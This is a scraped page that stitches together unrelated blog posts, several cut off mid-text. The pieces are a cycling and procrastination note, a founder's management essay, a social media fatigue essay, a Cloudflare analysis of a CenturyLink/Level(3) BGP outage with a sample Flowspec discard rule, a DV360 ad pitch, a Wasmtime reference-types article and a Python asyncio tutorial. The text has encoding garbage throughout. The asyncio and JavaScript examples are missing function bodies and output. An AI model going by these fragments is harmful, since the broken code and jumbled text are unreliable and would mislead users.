<p>My other new distraction has been cycling. Cycling was something I used to love years ago, but since moving around and living in tiny apartments I’ve never owned a bike. Now, with the covid lockdowns and my reaching the limits of my sanity staying inside my tiny apartment all day every day, I decided to get a tiny folding bike. Since then biking has become my go-to way of distracting myself when I should be doing something else. Now at least I’m getting good exercise and discovering all sorts of new places around me I’ve never even known exist. I can go on rides with friends and who knows, maybe I’ll even join a biking group once things start calming down and get some social contact out of it. Instead of feeling sick and disgusted with myself laying on the couch watching hours of Youtube nonsense with glazed over eyes, I can come back from a several hour long ride feeling refreshed and amazing. Still, I’d rather I could keep myself focused, but if not at least I can stay healthy in the process!</p>

<p>I’ve come to realize not all time spent procrastinating is equal. There’s definitely a hierarchy of how I can spend my time while still distracting my brain, and I’ve started trying to nudge myself into these higher-value activities when I need a break. I’m still procrastinating, but I’m doing it productively!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content"> <article>   <p>When I started managing about a decade ago I was terrible for the reasons many founders are: I’m my own biggest critic. I have extremely high expectations for myself, and as a result have high expectations for others. The frustration of incompetence blinded me from seeing the problem for what it was.</p> <p>It took me years to learn that there’s a separation between the words you <em>want</em> to say and the words that <em>get the job done</em>. I realized humans are systems, and if someone isn’t performing, I needed to fix the root cause, not complain about the proximal issue. Also, while actions might be globally irrational, they are always locally rational to the actor. The employee thinks they’re doing the right thing.</p> <p>Rage doesn’t work. What I learned does work (after years of trying) is curiosity. Curiosity about what caused the person to make a mistake.</p> <ul> <li>“Not productive enough” -&gt; Do they feel too restricted in their role to be productive?</li> <li>“Too distracted” -&gt; How clear is it to them what <em>you</em> want them to do?</li> <li>“Demoralizing the team” -&gt; Why are they unhappy, in general?</li> </ul> <p>It becomes interesting not just to understand the deeper issue, but to brainstorm how you might construct the most compelling reality <em>for them</em>. A CEO is like a dream architect in Inception, and your “IC work” is designing a thrilling environment for everyone to dream in.</p> <p>A good prompt I use is just that – “How can I make this <em>awesome</em> for X?”. Try it next time instead of complaining. It works!</p> <h3 id="millennials">Millennials</h3> <p>I’ve also swung in the opposite direction, constantly feeling insecure that – <em>heaven forbid</em> – an engineer might find their work boring for an hour or two.</p> <p>While you do need to direct a movie for your team that’s broadly exciting, it does not need to be a Christopher Nolan $500M epic thriller. Even the CEO does boring work. Boring work is fine.</p> <p>It took me a while to understand that I’m allowed to say things like “I need you to do X for me”. This is even ideal at certain moments. People want a leader that comports themselves with gravitas and authority. (These “sudo” moments have a certain cost to them. It shouldn’t be the majority of your interactions, but it certainly can be some.)</p> <p>And if not, there is plenty of capable engineering talent around the world that will happily be paid to do the work. Silicon Valley, while mostly being a tremendously positive cultural exporter, has also bred a generation of talent that has an adversarial relationship with work. A cohort of developers that grew up with so much excess, it views work as something to do the bare minimum of, instead of take pride in. (I find these people very easy to screen for: they’re simply unhappy in general.)</p> <h3 id="closing">Closing</h3> <p>If they aren’t performing, take a breath, quell the rage, and ask yourself “why”. And feel free to ask people to work if you employ them.</p> </article>   </div></div>]]>

			<p>Every few months I have to delete my twitter app off my phone. Otherwise I might fall prey to ‘Social Media Empathy Burnout Fatigue Syndrome’. This isn’t really a thing. It’s a combination of ‘<a href="https://www.psychologytoday.com/us/blog/science-made-practical/201911/how-avoid-empathy-burnout">empathy burnout</a>‘ and ‘<a href="https://medium.com/@LanceUlanoff/are-we-suffering-from-social-media-fatigue-573f99b5df30">social media fatigue</a>‘. Two terms that I’ve come across to describe the fallout of constantly checking our social media feeds. We can’t help but feel empathy and a significant degree of fatigue as we scan every update and reaction. Right now with emotions about to reach fever pitch at election time, it’s going to get a lot worse. There are good reasons to love social media. For instance if I need to immediate information (like how bad the fires are in the bay area), I can get a real time feed like no other source. Many times you can sneak a heads up on something important and get ahead of it, e.g. stocking up on toilet paper in a pandemic. But on the flip side we have good reasons to hate it. Any medium that encourages quick fire, short, gut reactions that you can’t take back become quite ugly. And it can come at a high personal cost too.</p>
<h4>Watch out for any medium that stores initial reactions forever</h4>
<p>I tend not to post that often especially if a story is unfolding and I don’t know all the facts. Not so for some people on social media. If you want to see a steady stream of no holds barred gut reactions on display take a look at trending topics, then click on the top or latest tab. You’ll see the unfiltered musings of anyone who happens to be posting about that topic in a snapshot of time. It’s like being in a very large hall with everybody shouting opinions, facts, and cries for help. All of which you can hear them all as you scroll down the feed. But we know first reactions aren’t always right. <a href="https://www.goodreads.com/book/show/11468377-thinking-fast-and-slow">Daniel Kahneman’s bestselling book on fast and slow brain thinking</a>. The fast brain is the initial reaction, fast, intuitive and emotional. We need that kind of thinking sometimes when we have to react suddenly and our brain will naturally behave that way like first impressions of a new person. In that type of scenario your brain plays a helpful role in assessing the situation. But you’re rarely in a flight or fight when you’re choosing to post on social media. Sometimes we need the ‘<a href="https://suebehaviouraldesign.com/kahneman-fast-slow-thinking/">slow brain</a>‘ which is deliberate and more logical.</p>
<h4>You can’t help but pick a side</h4>
<p>Most situations don’t demand an instant reaction yet we are enticed into it, even with only sparse background information to hand. Your words are recorded and very possibly amplified. What’s worse is that it’s hard to rescind that first reaction. In fact it’s natural to double down instead. Take for example a new trending story on twitter e.g. shootings at protests. Here are the inevitable turn of events which I’ve based on my own experience when spending too much time on trending topics. A shooting is reported. First the reports claim an initial viewpoint which is usually backed up by videos. It’s easy to believe this is the ultimate story. At this stage you instinctively choose a side maybe biased by a previous political leaning. Other videos emerge maybe from another angle that make you question that initial assessment. Too late you’ve already liked or commented. Once you’ve reacted you’re backed into a corner. Depending on the audience you could be cancelled or you could be celebrated. This could change in a second if even more new contradictory information comes to light. For some people there is confusion and fatigue as you try to reconcile what is really happening. If you didn’t react online, phew, you can save yourself the embarrassment. For others I suspect, it’s a question of searching for information that will corroborate your view because your mind is already made up and you’ve backed a horse.</p>
<h4>How sure can we be of anything online?</h4>
<p>What’s missing for sure is a chance to evaluate with all the real facts presented before you. There’s just no time for that. The medium functions like a trap. The casual remarks you might make with a few people around are not able to be tested in a safe environment. It’s out there for anybody to see and we might come to regret it. We all are prone to form an incorrect and untruthful opinion based on the knowledge we had at that time. The best philosophers throughout history have argued that we can’t be sure we know anything at all. Yet here we are expressing opinions on a medium that preserves our every word and may even amplify it. It can come at a great cost. Twitter famously doesn’t allow you to edit once it’s posted. You can delete but not edit. Unfortunately anyone can screenshot your post so once it’s up there, it’s up there and very difficult to deny. Many have experienced the humiliation of an objectionable long posted tweet which resurfaces years later.</p>
<h4>In real life you can gauge reaction</h4>
<p>In real life you have other indicators alongside an opinion. Perhaps the person has had a few drinks or they look like they’re not fully concentrating – things we can see. Online, all we have is the words, lacking context. After all who checks to see all the great things that person said before or diligently checks their qualifications in an internet minute. In person you have the opportunity to refine what you say in real time as you see the faces and body language of early reactions. It’s a safe place to offer an opinion especially if you’re uncertain and the group is small and close. Online, all those affordances are gone. We’re already suffering from lack of real life interactions in the pandemic and the consequences will become apparent. Being able to discuss and challenge in a face to face situation has been irreplaceable in some creative environments. This might be one of the things that set us back. The same hasty judgements and context lacking comments that we see on social media may seep into our every day work. It might be a smaller hall full of people shouting but it will still have the same distractions and traps. Once you’ve reacted online for work (be it slack or another internal feed), you could still fall prey to back an idea that you feel compelled to defend to the death. Even after new evidence emerges that should sway your opinion. Work or personal, our online behavior plays out in a similar way.</p>
<h4>The burnout and fatigue will make you unproductive</h4>
<p>I’m always more productive once I’ve taken a break from social media – always. It’s hard to stop watching a car crash and it’s hard to stop refreshing a feed when a big event is happening. So without thinking you refresh and scroll in any empty moment. However, your brain needs quiet time to be creative and productive. Filling that time up with the consumption of updates, tidbits of news, opinions, even if harmless and amusing takes away that quiet time to reflect. We’re starting to understand that open desk working is having negative impacts (and it will be interesting to see how home working has served to reverse that). We also need to understand that a busy mind filled with social media distractions in not conducive to productivity. How can we think of new things when our minds are busy processing the constant stream of updates, much of which makes us none the wiser? Empathy burnout and social media fatigue are real things.</p>
<h4>Go on, take a Social Media holiday</h4>
<p>I advocate social media holidays. If you’re at home during this pandemic, and finding it difficult to kick off new projects that you might have the unique opportunity to do while working at home. Ensure you’ve taken steps to create a distraction free working environment. I expect I will install Twitter back on my phone very soon. Until then I will enjoy the freedom of leaving a loud busy hall, full of shouting people into a calm side space for at least a little while.</p>

<p><img src="https://blog-cloudflare-com-assets.storage.googleapis.com/2020/08/4-1.png" alt="Analysis of Today's CenturyLink/Level(3) Outage"></p>
<p>Today CenturyLink/Level(3), a major ISP and Internet bandwidth provider, experienced a significant outage that impacted some of Cloudflare’s customers as well as a significant number of other services and providers across the Internet. While we’re waiting for a post mortem from CenturyLink/Level(3), I wanted to write up the timeline of what we saw, how Cloudflare’s systems routed around the problem, why some of our customers were still impacted in spite of our mitigations, and what appears to be the likely root cause of the issue.</p>
<h3>Increase In Errors</h3>
<p>At 10:03 UTC our monitoring systems started to observe an increased number of errors reaching our customers’ origin servers. These show up as â€œ522 Errorsâ€� and indicate that there is an issue connecting from Cloudflare’s network to wherever our customers’ applications are hosted. </p>
<p>Cloudflare is connected to CenturyLink/Level(3) among a large and diverse set of network providers. When we see an increase in errors from one network provider, our systems automatically attempt to reach customers’ applications across alternative providers. Given the number of providers we have access to, we are generally able to continue to route traffic even when one provider has an issue.</p>

<p>The diverse set of network providers Cloudflare connects to. Source: https://bgp.he.net/AS13335#_asinfo</p>
<h3>Automatic Mitigations</h3>
<p>In this case, beginning within seconds of the increase in 522 errors, our systems automatically rerouted traffic from CenturyLink/Level(3) to alternate network providers we connect to including Cogent, NTT, GTT, Telia, and Tata.</p>
<p>Our Network Operations Center was also alerted and our team began taking additional steps to mitigate any issues our automated systems weren’t automatically able to address beginning at 10:09 UTC. We were successful in keeping traffic flowing across our network for most customers and end users even with the loss of CenturyLink/Level(3) as one of our network providers.</p>

<p>Dashboard Cloudflare’s automated systems recognizing the damage to the Internet caused by the CenturyLink/Level(3) failure and automatically routing around it.</p>
<p>The graph below shows traffic between Cloudflare’s network and six major tier-1 networks that are among the network providers we connect to. The red portion shows CenturyLink/Level(3) traffic, which dropped to near-zero during the incident. You can also see how we automatically shifted traffic to other network providers during the incident to mitigate the impact and ensure traffic continued to flow.</p>

<p>Traffic across six major tier-1 networks that are among the network providers Cloudflare connects to. CenturyLink/Level(3) in red.</p>
<p>The following graph shows 522 errors (indicating our inability to reach customers’ applications) across our network during the time of the incident. </p>
<p><img src="https://blog-cloudflare-com-assets.storage.googleapis.com/2020/08/4-2.png" alt="Analysis of Today's CenturyLink/Level(3) Outage"></p>
<p>The sharp spike up at 10:03 UTC was the CenturyLink/Level(3) network failing. Our automated systems immediately kicked in to attempt to reroute and rebalance traffic across alternative network providers, causing the errors to drop in half immediately and then fall to approximately 25 percent of the peak as those paths were automatically optimized.</p>
<p>Between 10:03 UTC and 10:11 UTC our systems automatically disabled CenturyLink/Level(3) in the 48 cities where we’re connected to them and rerouted traffic across alternate network providers. Our systems take into account capacity on other providers before shifting out traffic in order to prevent cascading failures. This is why the failover, while automatic, isn’t instantaneous in all locations. Our team was able to apply additional manual mitigations to reduce the number of errors another 5 percent.</p>
<h3>Why Did the Errors Not Drop to Zero?</h3>
<p>Unfortunately, there were still an elevated number of errors indicating we were still unable to reach some customers. CenturyLink/Level(3) is among the largest network providers in the world. As a result, many hosting providers only have single-homed connectivity to the Internet through their network.</p>
<p>To use the old Internet as a â€œsuperhighwayâ€� analogy, that’s like only having a single offramp to a town. If the offramp is blocked, then there’s no way to reach the town. This was exacerbated in some cases because CenturyLink/Level(3)’s network was not honoring route withdrawals and continued to advertise routes to networks like Cloudflare’s even after they’d been withdrawn. In the case of customers whose only connectivity to the Internet is via CenturyLink/Level(3), there was no way for us to reach their applications and they continued to see 522 errors until CenturyLink/Level(3) resolved their issue around 14:30 UTC.</p>
<p>The same was a problem on the other (â€œeyeballâ€�) side of the network. Individuals need to have an onramp onto the Internet’s superhighway. An onramp to the Internet is essentially what your ISP provides. CenturyLink is one of the largest ISPs in the United States.</p>
<p><img src="https://blog-cloudflare-com-assets.storage.googleapis.com/2020/08/5-1.png" alt="Analysis of Today's CenturyLink/Level(3) Outage"></p>
<p>Source: https://broadbandnow.com/CenturyLink</p>
<p>Because this outage appeared to take all of the CenturyLink/Level(3) network offline, individuals who are CenturyLink customers would not have been able to reach Cloudflare or any other Internet provider until the issue was resolved. Globally, we saw a 3.5% drop in global traffic during the outage, nearly all of which was due to a nearly complete outage of CenturyLink’s ISP service across the United States.</p>
<h3>So What Likely Happened Here?</h3>
<p>While we will not know exactly what happened until CenturyLink/Level(3) issue a post mortem, we can see clues from BGP announcements and how they propagated across the Internet during the outage. BGP is the Border Gateway Protocol. It is how routers on the Internet announce to each other what IPs sit behind them and therefore what traffic they should receive.</p>
<p>Starting at 10:04 UTC, there were a significant number of BGP updates. A BGP update is the signal a router makes to say that a route has changed or is no longer available. Under normal conditions, the Internet sees about 1.5MBs â€“ 2MBs of BGP updates every 15 minutes. At the start of the incident, the number of BGP updates spiked to more than 26MBs of BGP updates per 15 minute period and stayed elevated throughout the incident.</p>
<p><img src="https://blog-cloudflare-com-assets.storage.googleapis.com/2020/08/6-1.png" alt="Analysis of Today's CenturyLink/Level(3) Outage">Source: http://archive.routeviews.org/bgpdata/2020.08/UPDATES/</p>
<p>These updates show the instability of BGP routes inside the CenturyLink/Level(3) backbone. The question is what would have caused this instability. The CenturyLink/Level(3) status update offers some hints and points at a flowspec update as the root cause.</p>
<p><img src="https://blog-cloudflare-com-assets.storage.googleapis.com/2020/08/7-1.png" alt="Analysis of Today's CenturyLink/Level(3) Outage"></p>
<h3>What’s Flowspec?</h3>
<p>In CenturyLink/Level(3)’s update they mention that a bad Flowspec rule caused the issue. So what is Flowspec? Flowspec is an extension to BGP, which allows firewall rules to be easily distributed across a network, or even between networks, using BGP. Flowspec is a powerful tool. It allows you to efficiently push rules across an entire network almost instantly. It is great when you are trying to quickly respond to something like an attack, but it can be dangerous if you make a mistake.</p>
<p>At Cloudflare, early in our history, we used to use Flowspec ourselves to push out firewall rules in order to, for instance, mitigate large network-layer DDoS attacks. We suffered our own Flowspec-induced outage more than 7 years ago. We no longer use Flowspec ourselves, but it remains a common protocol for pushing out network firewall rules.</p>
<p>We can only speculate what happened at CenturyLink/Level(3), but one plausible scenario is that they issued a Flowspec command to try to block an attack or other abuse directed at their network. The status report indicates that the Flowspec rule prevented BGP itself from being announced. We have no way of knowing what that Flowspec rule was, but here’s one in Juniper’s format that would have blocked all BGP communications across their network.</p>
<pre><code>route DISCARD-BGP {
   match {
      protocol tcp;
      destination-port 179;
   }
 then discard;
}
</code></pre>
<h3>Why So Many Updates?</h3>
<p>A mystery remains, however, why global BGP updates stayed elevated throughout the incident. If the rule blocked BGP then you would expect to see an increase in BGP announcements initially and then they would fall back to normal.</p>
<p>One possible explanation is that the offending Flowspec rule came near the end of a long list of BGP updates. If that were the case, what may have happened is that every router in CenturyLink/Level(3)’s network would receive the Flowspec rule. They would then block BGP. That would cause them to stop receiving the rule. They would start back up again, working their way through all the BGP rules until they got to the offending Flowspec rule again. BGP would be dropped again. The Flowspec rule would no longer be received. And the loop would continue, over and over.</p>
<p>One challenge of this is that on every cycle, the queue of BGP updates would continue to increase within CenturyLink/Level(3)’s network. This may have gotten to a point where the memory and CPU of their routers was overloaded, causing an additional set of challenges to getting their network back online.</p>
<h3>Why Did It Take So Long to Fix?</h3>
<p>This was a significant global Internet outage and, undoubtedly, the CenturyLink/Level(3) team received immediate alerts. They are a very sophisticated network operator with a world class Network Operations Center (NOC). So why did it take more than four hours to resolve?</p>
<p>Again, we can only speculate. First, it may have been that the Flowspec rule and the significant load that large number of BGP updates imposed on their routers made it difficult for them to login to their own interfaces. Several of the other tier-1 providers took action, it appears at CenturyLink/Level(3)’s request, to de-peer their networks. This would have limited the number of BGP announcements being received by the CenturyLink/Level(3) network and helped give it time to catch up.</p>
<p>Second, it also may have been that the …</p></div></div>

				<div>
					<div><p>When it comes to online advertising, it’s our experience that digital marketers like you should be using both Google Ads and Display and Video 360 for optimum advertising performance. </p>

<p>After all, many of you have likely seen a positive ROI from your Google Ads campaigns, and we all know that this staple of CPC advertising is a must-have for any business. However, we can safely say that to improve on that ROI, you need to be adding Display and Video 360 to your Google Ads account. </p>

<p>Not only does DV360 allow you to access more advertising networks and third-party data providers, but it gives you more versatility in the advertising campaigns you create. Its powerful creative tools can help you craft stunning ads that you can put in front of your exact target audience, given that it allows you to target more metrics than Google Ads.</p>

<p>In addition, DV360 gives you more control over your advertising budget. You can customize all of your bidding based on your goals, and the ability to input a budget and have the Bid Manager stop when that budget is reached means you’ll always know what you’re spending on your ad campaigns. </p>

<p>However, it would be unrealistic for us to say that DV360 is the perfect solution for every business. </p>

<p>As with any new part of your marketing strategy, we recommend that you test DV360 in parallel to your other advertising campaigns, and in particular to Google Ads, to determine each platform’s ability to deliver a positive ROI. Only then will you be able to determine which advertising platform is the best for your business.

August 30, 2020 | https://bytecodealliance.org/articles/reference-types-in-wasmtime | <a href="https://web.archive.org/web/*/https://bytecodealliance.org/articles/reference-types-in-wasmtime">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>A few week ago, I finished implementing support for <a href="https://github.com/WebAssembly/reference-types/blob/master/proposals/reference-types/Overview.md">the WebAssembly reference
types proposal</a> in Wasmtime. <a href="https://github.com/bytecodealliance/wasmtime/">Wasmtime</a> is a standalone,
outside-the-Web WebAssembly runtime, and the reference types proposal is
WebAssembly’s first foray beyond simple integers and floating point numbers,
into the exciting world of garbage-collected references. This article will
explain what the reference types proposal enables, what it leaves for future
proposals, and how it is implemented in Wasmtime.</p>

<h2 id="what-are-reference-types">What are Reference Types?</h2>

<p>Without the reference types proposal, WebAssembly can only manipulate simple
integer and floating point values. It can’t take or return references to the
host’s objects like, for example, a DOM node on a Web page or an open connection
on a server. There are workarounds: for example, you can store the host objects
in a side table and refere to them by index, but this adds an extra indirection
and implementing the side table requires cooperating glue code on the host
side. That glue code, in particular, is annoying because it is outside of the
Wasm sandbox, diluting Wasm’s safety guarantees, and it is host-specific. If you
want to use your Wasm module on the Web, in a Rust host, and in a Python host,
you’ll need three separate glue code implementations. This makes WebAssembly
less attractive as a universal binary format.</p>

<p>With the reference types proposal, you don’t need glue code to interact with
host references. The proposal has three main parts:</p>

<ol>
  <li>
    <p>A new <code>externref</code> type, representing an opaque, unforgable reference to a
host object.</p>
  </li>
  <li>
    <p>An extension to WebAssembly tables, allowing them to hold <code>externref</code>s in
addition to function references.</p>
  </li>
  <li>
    <p>New instructions for manipulating tables and their entries.</p>
  </li>
</ol>

<p>With these new capabilities, Wasm modules can talk about host references
directly, rather than requiring external glue code running in the host.</p>

<p><code>externref</code>s play nice with WebAssembly’s sandboxing properties:</p>

<ul>
  <li>
    <p>They are <em>opaque</em>: a Wasm module cannot observe an <code>externref</code> value’s bit
pattern. Passing a reference to a host object into a Wasm module doesn’t
reveal any information about the host’s address space and the layout of host
objects within it.</p>
  </li>
  <li>
    <p>They are <em>unforgable</em>: a Wasm module can’t create a fake host reference out of
thin air. It can only return either a reference you already gave it or the
null reference. It <em>cannot</em> pretend like the integer value <code>0x1bad2bad</code> is a
valid host reference, return it to you, and trick you into dereferencing this
invalid pointer.</p>
  </li>
</ul>

<h2 id="example">Example</h2>

<p>Here’s a Wasm module that exports a <code>hello</code> function which takes, as an
<code>externref</code> parameter, a reference to an open file and writes “Hello, Reference
Types!” to the file. This module imports the <code>write</code> syscall from a hypothetical
future version of <a href="https://wasi.dev/">WASI</a>, the WebAssembly System Interface, that leverages
reference types.</p>

<p>This Wasm module will run in <em>any</em> WebAssembly environment where WASI is
available.<sup id="back-ref-wasi-available"><a href="#foot-ref-wasi-available">0</a></sup> We don’t need glue code that is
maintaining a side table, mapping host references to indices.</p>

<p>Running <code>hello.wat</code> — once again, without module-specific glue code
— is just as easy in <a href="https://github.com/bytecodealliance/wasmtime-dotnet/">.NET</a> and <a href="https://github.com/bytecodealliance/wasmtime-go">Go</a> host
environments, and is left as an exercise for the reader ;)</p>

<h3 id="on-the-web">On the Web</h3>

<p>Unlike the other host environments we’ve considered, WASI isn’t natively
implemented on the Web. There’s nothing stopping us, however, from polyfilling
WASI APIs with a little bit of JavaScript and a couple DOM methods! This is
still an improvement because there is overall less module-specific glue
code. Once one person has written the polyfills, everyone’s Wasm modules can
reuse them.</p>

<p>There are many different things an “open file” could be modeled by on the
Web. For this demo, we’ll use a DOM node: writing to it will append text
nodes. This works well because we know our module is only writing text data. If
we were working with binary data, we would choose another polyfilling approach,
like in-memory array buffers backing the file data.</p>

<p>Here is the JavaScript code to run our <code>hello.wat</code> module and polyfill our
<code>future-wasi.write</code> function:</p>

<div><div><pre><code><span>// The DOM node we will use as an "open file".</span>

<p>You can view a live demo of this code in the iframe below. It should work in
Firefox 79+, or any other browser that supports reference types (at the time of
writing, Chrome has support for an older version of the reference types proposal
behind the <code>--experimental-wasm-anyref</code> flag, and Safari has in-progress support
behind the <code>JSC_useWebAssemblyReferences</code> flag.)</p>



<h2 id="what-comes-after-the-reference-types-proposal">What Comes After the Reference Types Proposal?</h2>

<p>The in-progress <a href="https://github.com/WebAssembly/proposal-type-imports/blob/master/proposals/type-imports/Overview.md">WebAssembly type imports proposal</a> builds on
reference types to let you distinguish between different kinds of host objects:
database connections and open files would be separate types. Or, on the Web,
Wasm would distinguish JavaScript <code>Promise</code>s from DOM nodes. It also adds
references that point to types defined by other Wasm modules, not just host
objects.</p>

<p>WASI will want to adopt unforgable reference types for file handles, as the
examples above suggest, instead of using integers. It might make sense for WASI
to wait for type imports, however, so it can use separate types for, say, an
open file and a source of entropy. This is a decision for the WASI subgroup of
the WebAssembly Community Group. Either way, when WASI does make this switch, it
will continue to support integer file descriptors, but implemented inside the
Wasm sandbox as indices into an <code>externref</code> Wasm table.</p>

<p>The <a href="https://github.com/WebAssembly/interface-types/blob/master/proposals/interface-types/Explainer.md">interface types</a> and <a href="https://github.com/WebAssembly/module-linking/blob/master/proposals/module-linking/Explainer.md">module linking</a> proposals promise to remove even more
glue code and bindings. The interface …</p></div></div>

A lot has changed since I last published my post on handling long-running async tasks in Python using celery. Last time we used it to run a few async tasks to fetch data from some service which took around 1-5 minutes. You can read more about it in the post below.</p>

Although I will still use celery for these types of long-running tasks, there is a subset of tasks that are better handled inside the execution thread itself. Today we will discuss a way of handling such operations.</p>

<p>
To the people who know me, I switched to a new role which allowed me to write Node.js over a year ago and I have been working on it since then. During my time working and building APIs using it, I have started falling for the way in which Node handles Async behavior and long-running tasks.</p>
<p>
The idea is simple, if the task is waiting for some IO, we can run some other task in the mean-time. Only the part that needs it, will wait for it.</p><p>
I wanted to use the same concept in Python. Fortunately, in Python version <code>3.4</code>, they have introduced <code>asyncio</code> for the same purpose. In this post, we are going to talk a little about it and try to understand its importance.</p><p>
By the end of the post, you will be able to understand the importance of async functions and will be able to start using them into your codebase.</p>
<h2 id="prerequisite">Prerequisite</h2><p>
I am using <code>Python 3.8</code> for this tutorial and you might want to use the same to run and try out the examples. You can try them <a href="https://www.python.org/shell/">online as well</a>.</p>
<h2 id="basic-async-function-in-python">Basic async function in Python</h2><p>
This is how we write a basic async function in Python.</p>
<div><div><pre><code><span>import</span> <span>asyncio</span>

<span>async</span> <span>def</span> <span>func1</span><span>(</span><span>a</span><span>):</span>
    <span>print</span><span>(</span><span>"started func 1: {}"</span><span>,</span> <span>a</span> <span>+</span> <span>1</span><span>)</span>
    <span>await</span> <span>asyncio</span><span>.</span><span>sleep</span><span>(</span><span>1</span><span>)</span>
    <span>return</span> <span>a</span> <span>+</span> <span>1</span>

<span>asyncio</span><span>.</span><span>run</span><span>(</span><span>func1</span><span>(</span><span>1</span><span>))</span>
</code></pre></div></div>
<p><strong>Response</strong></p>
<p>
You have to start by importing the <code>asyncio</code> module.</p><p>
Async functions are defined just like a normal function, you just have to add the keyword, <code>async</code>. If you want to wait for the execution of some <a href="https://docs.python.org/3/library/asyncio-task.html#coroutines">coroutine</a>, you have to use the keyword, <code>await</code>.</p><p>
Finally, you can run the function using <code>asyncio.run</code> method.</p>
<blockquote>
Anytime you use the await keyword inside the async function, the thread will not move forward until we get a response from the called function.
</blockquote><p>
This simple implementation will not help you understand the advantage of using async functions. In the next section, we will talk about the time taken for the execution and there you will really start to see the difference.</p>
<h2 id="time-taken-for-the-full-execution">Time taken for the full execution</h2><p>
To understand the benefits of using <code>async</code> functions, we will compare the time taken to run the same code in <code>async</code> and <code>sync</code> behavior.</p><p>
Letâ€™s first write the async code.</p>

I have defined 4 different functions doing almost the same thing. Letâ€™s assume there is a long-running function called <code>async_sleep</code> which is doing some IO operation. For example: Fetching data from the database.</p>
<blockquote>
<code>asyncio.gather()</code> is used to run the tasks passed to it concurrently.
</blockquote><p>
The response after running this code is as follows.</p>
<div><div><pre><code><span>started</span> <span>func</span> <span>1</span><span>:</span> <span>2</span>
<span>started</span> <span>func</span> <span>2</span><span>:</span> <span>3</span>
<span>started</span> <span>func</span> <span>3</span><span>:</span> <span>4</span>
<span>started</span> <span>func</span> <span>4</span><span>:</span> <span>5</span>
<span>Completed</span> <span>after</span><span>:</span> <span>1.1852593421936035</span>
</code></pre></div></div><p>
The function completes the execution somewhere between 1-2 seconds for every execution. (Ran it 5 times to check).</p><p>
Now letâ€™s try to run the <code>sync</code> version of the same code.</p>
<div><div><pre><code><span>import</span> <span>time</span>
<span>start</span> <span>=</span> <span>time</span><span>.</span><span>time</span><span>()</span>

    <span>print</span><span>(</span><span>"started func 1: {}"</span><span>.</span><span>format</span><span>(</span><span>a</span> <span>+</span> <span>1</span><span>))</span>
    <span>sync_sleep</span><span>()</span>
    <span>return</span> <span>a</span> <span>+</span> <span>1</span>


<span>def</span> <span>func2</span><span>(</span><span>a</span><span>):</span>
    <span>print</span><span>(</span><span>"started func 2: {}"</span><span>.</span><span>format</span><span>(</span><span>a</span> <span>+</span> <span>2</span><span>))</span>
    <span>sync_sleep</span><span>()</span>
    <span>return</span> <span>a</span> <span>+</span> <span>2</span>

    <span>print</span><span>(</span><span>"started func 3: {}"</span><span>.</span><span>format</span><span>(</span><span>a</span> <span>+</span> <span>3</span><span>))</span>
    <span>sync_sleep</span><span>()</span>
    <span>return</span> <span>a</span> <span>+</span> <span>3</span>


<span>def</span> <span>func4</span><span>(</span><span>a</span><span>):</span>
    <span>print</span><span>(</span><span>"started func 4: {}"</span><span>.</span><span>format</span><span>(</span><span>a</span> <span>+</span> <span>4</span><span>))</span>
    <span>sync_sleep</span><span>()</span>
    <span>return</span> <span>a</span> <span>+</span> <span>4</span>


<span>def</span> <span>main</span><span>():</span>
    <span>func1</span><span>(</span><span>1</span><span>)</span>
    <span>func2</span><span>(</span><span>1</span><span>)</span>
    <span>func3</span><span>(</span><span>1</span><span>)</span>
    <span>func4</span><span>(</span><span>1</span><span>)</span>
    <span>print</span><span>(</span><span>"Completed after: {}"</span><span>.</span><span>format</span><span>(</span><span>time</span><span>.</span><span>time</span><span>()</span> <span>-</span> <span>start</span><span>))</span>

<span>main</span><span>()</span>
</code></pre></div></div><p>
The response that we got after executing this was:</p>
<div><div><pre><code><span>started</span> <span>func</span> <span>1</span><span>:</span> <span>2</span>
<span>started</span> <span>func</span> <span>2</span><span>:</span> <span>3</span>
<span>started</span> <span>func</span> <span>3</span><span>:</span> <span>4</span>
<span>started</span> <span>func</span> <span>4</span><span>:</span> <span>5</span>
<span>Completed</span> <span>after</span><span>:</span> <span>4.168870687484741</span>
</code></pre></div></div><p>
This saved us <code>~3</code> seconds for executing 4 functions. Now if we wanted to run 10000 such functions, we would save ourselves <code>~2000</code> seconds/ i.e. <code>35-40</code> minutes.</p><p>
Thatâ€™s awesome, right.</p><p>
Even if we are just running 2-3 such functions in each iteration these small savings can be very important to provide better user experience to your customers.</p><p>
Now that we have understood the advantage of using <code>async</code> functions, we must know a few more things about it.</p>
<h2 id="order-of-execution-for-async-functions">Order of execution for async functions</h2><p>
We should understand that while running the functions in async mode, we donâ€™t really know about the order in which functions are executed. Letâ€™s understand the concept with an example.</p><p>
The functions will return as soon as the execution is completed.</p><p>
We can mock the different execution time by sleeping for a random time between 0 and 1 using, <code>random.randint(0, 10) * 0.1</code>.</p><p>
Here is the full code.</p>
<div><div><pre><code><span>import</span> <span>asyncio</span>
<span>import</span> <span>time</span>

<span>asyncio</span><span>.</span><span>run</span><span>(</span><span>main</span><span>())</span>
</code></pre></div></div><p>
The response to the following code is,</p>
<div><div><pre><code><span>completed</span> <span>func</span> <span>0</span><span>:</span> <span>1</span>
<span>completed</span> <span>func</span> <span>3</span><span>:</span> <span>4</span>

<h2 id="practical-usage">Practical Usage</h2><p>
After the release of Python 3.8, which moved the <code>asyncio.run()</code> method to stable API, you can start using it without any problem.</p><p>
The only issue with moving from a <code>synchronous</code> approach to an async one, is to change the way of thinking about the problems. You have to change the way you think about every little detail. Once you reach that point of thinking in terms of async functions, believe me, you will love it.</p>
<h2 id="how-does-it-work-under-the-hood">How does it work under the hood?</h2><p>
Letâ€™s check the type of the async function.</p>
<div><div><pre><code><span>type</span><span>(</span><span>main</span><span>())</span>

<span># &lt;class 'coroutine'&gt;
</span></code></pre></div></div><p>
So, the async function is of type <code>coroutine</code>.</p><p>
This <a href="https://www.geeksforgeeks.org/coroutine-in-python/">GeeksForGeeks article</a> does a very good job of explaining coroutines.</p><p>
To sum up what they wrote in the post, <strong>subroutines</strong> are the set of instructions that have one entry point and are executed serially.</p><p>
On the other hand, <strong>Coroutines</strong> can suspend or give away the control to other Coroutines, allowing multiple tasks to run at the same time.</p><p>
Python uses this concept to allow async behavior.</p>
<h2 id="handling-timeout-in-async-functions">Handling timeout in async functions</h2><p>
